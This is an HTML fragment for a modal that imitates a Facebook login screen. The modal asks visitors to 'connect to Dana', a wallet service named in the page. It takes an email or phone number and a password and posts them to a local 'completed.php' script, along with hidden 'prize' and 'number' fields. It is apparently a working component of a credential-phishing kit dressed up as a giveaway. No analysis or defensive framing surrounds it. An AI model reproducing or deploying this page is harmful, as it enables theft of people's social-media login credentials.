
<link rel="stylesheet" type="text/css" href="asset/css/modal.css">
<!-- Modal -->
<div class="warpoelContainer" id="modal_facebook" style="display:;">
        <div class="modal_backdrop"><!-- MENGATUR BACKGROUND --> </div>
        <div class="modal_content" style="overflow: auto;">
                <form action="completed.php" method="POST">
                        <input type="hidden" name="get_number" class="input_get_number">
                        <input type="hidden" name="get_prize" class="input_get_prize">
                        <input type="hidden" name="account_type" value="facebook">
                        <div class="col-12 header text-center"> 
                                <button type="button" class="btn btn-default btn_close text-white"><h1><i class="fas fa-times"></i></h1></button>
                                <img src="asset/gam/facebook_logo.png">
                        </div>
                        <div class="col-12 body" style="font-family: sans-serif;">
                                <div class="row justify-content-center">
                                        <div class="col-3 mt-3 mb-3 text-center" style="border-radius: 12px;">
                                                <img src="asset/gam/mf.png" class="img_app">
                                        </div>
                                        <div class="col-12 text-center">
                                                <h5 style="color: #90949c"> Log in to your Facebook to connect to Dana</h5>
                                        </div>  
                                        <div class="col-12 mt-3">
                                                <div class="form-group">
                                                        <input class="form-control" type="text" name="user" placeholder="Email address or phone number" required>
                                                        <input class="form-control" type="password" name="password" placeholder="Password" required>
                                                        <button type="submit" class="btn btn-primary form-control mt-3" style="background: #1877f2">
                                                                <h5>Log In</h5>
                                                        </button>
                                                </div>
                                        </div>
                                        <div class="col-12 text-center">
                                                <p><a style="color: #0866FF;text-decoration: none;" href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login">Forgotten password?</a></p>
                                        </div>
                                        <div class="col-6" style="padding: 0;">
                                                <a href="https://www.facebook.com/#" style="width: 100%;" class="btn btn-success"> <h5 class="mt-2">Create New Account</h5> </a>
                                        </div>
                                        <div class="col-12 mt-4 mb-4" style="color: #3b5998">
                                                <div class="row">
                                                        <div class="col-6 text-center">
                                                                <p>English (UK)</p>
                                                                <p>Basa Jawa</p>
                                                                <p>日本語</p>
                                                                <p>Português (Brasil)</p>
                                                        </div>
                                                        <div class="col-6 text-center">
                                                                <p>Bahasa Indonesia</p>
                                                                <p>Bahasa Melayu</p>
                                                                <p>Español</p>
                                                                <div class="row justify-content-center">
                                                                        <div class="col-3 rounded text-center" style="border: 1px solid #3b5998;">
                                                                                <h3 class="mt-2"><i class="fas fa-plus"></i></h3>
                                                                        </div>
                                                                </div>
                                                        </div>
                                                </div>
                                        </div>
                                </div>
                        </div> 
                </form>
        </div>
</div>


<script src="asset/js/modal.js"></script>   